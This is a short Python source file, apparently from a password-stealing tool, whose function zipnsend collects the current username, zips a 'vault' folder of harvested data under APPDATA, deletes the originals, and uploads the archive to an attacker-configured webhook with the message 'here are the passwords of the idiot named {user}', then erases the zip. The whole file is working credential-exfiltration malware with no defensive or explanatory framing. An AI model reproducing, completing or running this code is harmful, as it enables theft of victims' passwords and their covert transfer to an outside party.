import os, zipfile, shutil, requests, subprocess
from co.config import WEBHOOK_URL
def zipnsend():
    user = subprocess.check_output('whoami', universal_newlines=True).split('\\')[-1]
    vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
    zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
    if os.path.exists(vault_folder):
        try:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(vault_folder): 
                    for file in files: zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), vault_folder))
            shutil.rmtree(vault_folder)
            with open(zip_file_path, 'rb') as f:
                payload = {
                    'content': f'here are the passwords of the idiot named {user}:',
                    'username': 'FULLBRIGHT',
                    'avatar_url': 'https://imgcdn.stablediffusionweb.com/2024/3/15/21585f60-3dcd-4b44-b522-79dc57d9640f.jpg'
                }
                response = requests.post(WEBHOOK_URL, data=payload, files={'file': (os.path.basename(zip_file_path), f)})
                print("File sent successfully." if response.status_code == 200 else f"Error: {response.status_code}")
            os.remove(zip_file_path)
        except Exception as e: 
            print(f"Error: {e}")
    else: 
        print("There isn't a vault folder.")